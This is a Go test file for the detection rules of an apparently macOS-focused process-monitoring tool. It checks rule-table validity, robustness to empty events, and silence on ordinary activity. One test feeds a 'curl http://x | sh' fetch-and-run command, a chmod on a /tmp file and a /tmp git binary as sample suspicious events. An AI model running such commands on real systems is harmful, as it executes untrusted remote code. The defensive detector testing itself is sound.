package rules

import (
	"testing"

	"github.com/drduh/mess/internal/event"
	"github.com/drduh/mess/internal/pids"
	"github.com/drduh/mess/internal/signals"
)

// Rules are well formed and have unique ids.
func TestTableIsWellFormed(t *testing.T) {
	seen := map[string]bool{}

	for _, r := range All {

		if err := r.Validate(); err != nil {
			t.Error(err)
		}
		if seen[r.ID] {
			t.Errorf("rule id %q appears twice", r.ID)
		}

		seen[r.ID] = true
	}

	last := signals.Alert

	for _, r := range All {
		if r.Tier < last {
			t.Errorf("rule %q (%s) comes after a %s rule", r.ID, r.Tier, last)
		}

		last = r.Tier
	}
}

// Every rule survives an event with no argv or target.
func TestEveryRuleSurvivesEmptyEvent(t *testing.T) {
	empty := []event.Event{
		{Time: minute(1), Cmd: nil},
		{Time: minute(1), Cmd: []string{}},
		{Time: minute(1), Cmd: []string{"x"}},
		{Time: minute(1), UID: 0, Cmd: nil, Target: event.Target{}},
	}

	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("a rule panicked on an empty event: %v", r)
		}
	}()

	signals.Build(All, pids.Over(empty), minute(0), minute(5), 8)
}

// Test known target with no argv.
func TestNoArgvSurvives(t *testing.T) {
	for _, image := range []string{
		"/bin/kill", "/usr/bin/pkill", "/usr/bin/killall", "/bin/chmod",
	} {
		e := event.Event{
			Time: minute(1), PID: 500, PPID: 1, UID: 0,
			Path: "/sbin/launchd", Sign: "com.apple.launchd", Sys: true, Cmd: nil,
			Target: event.Target{Path: image, Sys: true},
		}
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("%s with no argv panicked a rule: %v", image, r)
				}
			}()

			signals.Build(All, pids.Over([]event.Event{e}), minute(0), minute(5), 8)
		}()
	}
}

// Thresholds are drawable and keys are distinct.
func TestTableThresholdsAreDistinct(t *testing.T) {
	seen := map[string]string{}

	for _, r := range All {
		if r.Tune == nil {
			continue
		}

		if had, ok := seen[r.Tune.Key]; ok {
			t.Errorf("rules %s and %s both own the threshold %q", had, r.ID, r.Tune.Key)
		}

		seen[r.Tune.Key] = r.ID
	}
}

// Every row carries a usable search.
func TestEveryRowCarriesASearch(t *testing.T) {
	events := []event.Event{
		{Time: at(0), UID: 0, Path: "/bin/zsh",
			Cmd:    []string{"sh", "-c", "curl http://x | sh"},
			Target: event.Target{Path: "/bin/sh", UID: 0}},
		{Time: at(1), UID: 501, Path: "/bin/zsh",
			Cmd:    []string{"chmod", "+x", "/tmp/a"},
			Target: event.Target{Path: "/bin/chmod", UID: 501}},
		{Time: at(2), UID: 501, Path: "/bin/zsh",
			Cmd:    []string{"git", "status"},
			Target: event.Target{Path: "/tmp/git", UID: 501}},
	}
	for _, s := range signals.Build(All, pids.Over(events), at(0), at(9), 9) {
		for _, r := range s.Rows {
			if s.Scope == "file" {
				continue
			}

			if r.Find == "" {
				t.Errorf("%s: row %q has no search", s.ID, r.Key)
			}
		}
	}
}

// Every join in the table is one the interface implements.
func TestTableJoinsAreImplemented(t *testing.T) {
	for _, r := range All {
		if r.Join != "" && signals.Joins[r.Join] == "" {
			t.Errorf("rule %s names the join %q, which nothing implements",
				r.ID, r.Join)
		}
	}
}

// Every signal carries a tier word the browser knows.
func TestTableTiersAreWordsTheBrowserGroupsOn(t *testing.T) {
	sig := signals.Build(All,
		pids.Over([]event.Event{{Time: at(0), Path: "/bin/sh",
			Cmd: []string{"sh", "-c", "x"}}}), at(0), at(1), 1)

	if len(sig) != len(All) {
		t.Fatalf("build returned %d signals for %d rules", len(sig), len(All))
	}

	for _, s := range sig {
		if s.Tier != "alert" && s.Tier != "notice" && s.Tier != "context" {
			t.Errorf("rule %s has tier %q", s.ID, s.Tier)
		}
	}
}

// Test table of a capture of ordinary work.
func TestQuietOnOrdinaryWork(t *testing.T) {
	var evs []event.Event

	add := func(e event.Event) { evs = append(evs, e) }

	person := uint32(501)

	for i := 0; i < 200; i++ {
		add(event.Event{
			Time: newAt(i), PID: 1000 + i, PPID: 1, UID: 0, AUID: &person,
			Path: "/sbin/launchd", Sys: true,
			Cmd:    []string{"xpcproxy", "com.apple.mdworker"},
			Target: event.Target{Path: "/usr/libexec/xpcproxy", Sys: true, Sign: "com.apple.xpc.proxy"},
		})
		add(event.Event{
			Time: newAt(i), PID: 1000 + i, PPID: 1, OPPID: 1, UID: 0,
			Path: "/usr/libexec/xpcproxy", Sys: true,
			Cmd:    []string{"mdworker"},
			Target: event.Target{Path: "/usr/libexec/mdworker", Sys: true, Sign: "com.apple.mdworker"},
		})
	}

	for i := 0; i < 60; i++ {
		add(event.Event{
			Time: newAt(i), PID: 2000 + i, PPID: 700, UID: 501, AUID: &person,
			SID: 700, TTY: "/dev/ttys001", Path: "/bin/zsh", Sys: true, CWD: "/Users/p/src",
			Cmd: []string{"git", "status"},
			Target: event.Target{Path: "/opt/homebrew/bin/git", UID: 501, Team: "B1",
				Sign: "org.brew.git", Mode: 0o100755}})
	}

	for i := 0; i < 30; i++ {
		add(event.Event{
			Time: newAt(i), PID: 3000 + i, PPID: 500, UID: 501,
			Path: "/Applications/Firefox.app/Contents/MacOS/firefox", Team: "T1",
			Cmd: []string{"plugin-container"},
			Target: event.Target{
				Path: "/Applications/Firefox.app/Contents/MacOS/plugin-container",
				UID:  501, Team: "T1", Mode: 0o100755},
		})
	}

	list := signals.Build(All, pids.Over(evs), newAt(0), newAt(201), 60)

	allowed := map[string]string{}

	if len(list) != len(All) {
		t.Fatalf("build returned %d signals for %d rules", len(list), len(All))
	}

	for _, s := range list {
		if _, ok := allowed[s.ID]; ok {
			continue
		}

		if s.Count != 0 {
			t.Errorf("%s fired %d times on ordinary work: %v", s.ID, s.Count, s.Rows)
		}
	}

	if !t.Failed() {
		t.Logf("%d events of ordinary work, none of %d rules fired", len(evs), len(list))
	}
}
